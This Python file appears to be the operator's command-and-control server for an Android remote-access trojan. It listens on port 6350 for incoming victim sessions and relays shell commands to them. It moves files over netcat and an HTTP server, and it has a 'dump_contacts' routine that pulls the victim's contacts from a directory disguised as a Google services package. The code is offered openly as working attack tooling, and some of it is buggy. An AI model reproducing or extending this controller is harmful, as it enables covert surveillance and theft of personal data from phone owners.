#/bin/python3
try:
    from pynput.keyboard import Controller, Key
except Exception:
    pass
import kthread
import select
import socket
from os import system
import signal
from time import sleep
from banners import banner
from time import gmtime, strftime
import readline
import sys
import os
import threading

sessions = {}
active_session = 0
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(("0.0.0.0", 6350))
session_info = []


def parse(command):
    global active_session, session_info
    if command == "exit" and len(sessions) == 0:
        print("Exiting")
        for i in sessions:
            sessions[i].close()
        sock.close()
        os._exit(0)
    if command == "clear":
        system("clear")
    elif command == "sessions":
        if len(sessions) != 0:
            for i in sessions:
                print(session_info[i])
        else:
            print("There are no active sessions yet")
    elif command.startswith("sessions"):
        try:
            if command.startswith("sessions -i"):
                digit = [int(s) for s in command.split() if s.isdigit()]
                if digit[0] > len(sessions):
                    print("That session doesn't exist")
                else:
                    active_session = command[-1]
            elif command.startswith("sessions -k"):
                digit = [int(s) for s in command.split() if s.isdigit()]
                if digit[0] > len(sessions):
                    print("That session doesn't exist")
                else:
                    if active_session == digit[0] - 1:
                        sessions[active_session].send(("hide" + "\n").encode())
                        try:
                            read("hide")
                        except:
                            pass
                        active_session = - 1
                    sessions[digit[0] - 1].close()
                    sessions.pop(digit[0] - 1)
                    print("Killing session " + str(digit[0]))
        except IndexError:
            print("Invalid arguments")
    elif command == "banner":
        banner()
    elif command.startswith("download"):
        download_thread = kthread.KThread(target=download, args=(command,))
        download_thread.start()
        return command
    elif command.startswith("upload"):
        serve_thread = kthread.KThread(target=serve, args=(command,))
        serve_thread.start()
        return command
    elif command == "fix_read":
        read("a")
    else:
        return command


def download(file):
    directory = ""
    if "/" in file:
        file = file[:file.rindex("/")]
    system("nc -lvp 6351 > " + file)



def serve(file):
    directory = ""
    if "/" in file:
        directory = " --directory " + file[:file.rindex("/")]
    system("python3 -m http.server 6351" + directory)


def ctrl_c_handler(signum, frame):
    confirm = input("Kill session? y/n")
    if confirm == "y":
        sessions[active_session].send(("hide" + "\n").encode())
        read("hide")
        active_session = - 1
        sessions[digit[0] - 1].close()
        sessions.pop(digit[0] - 1)
    elif confirm == "n":
        pass
    else:
        print("Invalid response")


def ctrl_z_handler(signum, frame):
    if active_session != 0 & active_session != -1:
        sessions[active_session].send("hide")
        read("hide")
        home_shell()


signal.signal(signal.SIGINT, ctrl_c_handler)
signal.signal(signal.SIGTSTP, ctrl_z_handler)


def home_shell():
    try:
        while True:
            command = parse(input(">>"))
            if command:
                system(command)
                sleep(0.1)
    except InterruptedError:
        print("interrupted")


home = kthread.KThread(target=home_shell)


def accept_connection(addr):
    if home.is_alive():
        home.terminate()
        try:
            Controller().press(Key.enter)
            Controller().release(Key.enter)
        except Exception:
            pass
    print(f"Session {len(sessions)} created with {addr[0]}")

    connected = True
    while connected:
        send_command()


def read(command):
    #if command.startswith("download") or command.startswith("upload"):
    #    receiving = select.select([sessions[active_session]], [], [], 180)
    #    while receiving[0]:
    #        line = sessions[active_session].recv(1024).decode("utf-8")
    #        if "[END]" not in line:
     #           print(line)
      #          receiving = select.select([sessions[active_session]], [], [], 180)
       #     else:
        #        print(line[0:-7])
         #       break
      #  try:
       #     download_thread.terminate()
        #except:
        #    serve_thread.terminate()
    if command == "project_id":
        return sessions[len(sessions) - 1].recv(64).decode("utf-8")
    if command == "exit" or command == "hide":
        sessions[active_session].close()
        sessions.pop(active_session)
        home_shell()
    elif command == "dump_contacts":
        receiving = select.select([sessions[active_session]], [], [], 180)
        while receiving[0]:
            line = sessions[active_session].recv(1024).decode("utf-8")
            if "[END]" not in line:
                print(line)
                receiving = select.select([sessions[active_session]], [], [], 180)
            else:
                print(line[0:-7])
                break
        send_command("download /data/user/0/com.mgoogle.android.gms/cache/Data/contacts.csv")
    elif not command.startswith("cd") | command.startswith("mkdir") | command.startswith("touch"):
        receiving = select.select([sessions[active_session]], [], [], 3)
        while receiving[0]:
            line = sessions[active_session].recv(1024).decode("utf-8")
            if "[END]" not in line:
                print(line)
                receiving = select.select([sessions[active_session]], [], [], 3)
            else:
                print(line[0:-7])
                break


def send_command(direct_command=0):
    if direct_command == 0:
        command = input("$")
        command = parse(command)
        if command is not None:
            try:
                sessions[active_session].send((command + "\n").encode())
                read(command)
            except ConnectionResetError:
                sessions[active_session].close()
                sessions.pop(active_session)
                home_shell()
    else:
        try:
            sessions[active_session].send((direct_command + "\n").encode())
            read(direct_command)
        except ConnectionResetError:
            sessions[active_session].close()
            sessions.pop(active_session)
            home_shell()

def main():
    global home
    banner()
    sock.listen()
    i = 0
    home.start()
    while True:
        sessions[i], addr = sock.accept()
        threading.Thread(target=accept_connection, args=(addr,)).start()
        sessions[i].send("cat /data/user/0/com.mgoogle.android.gms/cache/Data/name.txt\n".encode())
        session_info.append(f"Session {str(i)}  Address: [{addr[0]}]   Connection time: {strftime('%H:%M:%S', gmtime())}    Project: {read('project_id')}  ")
        i += i


if __name__ == '__main__':
    main()
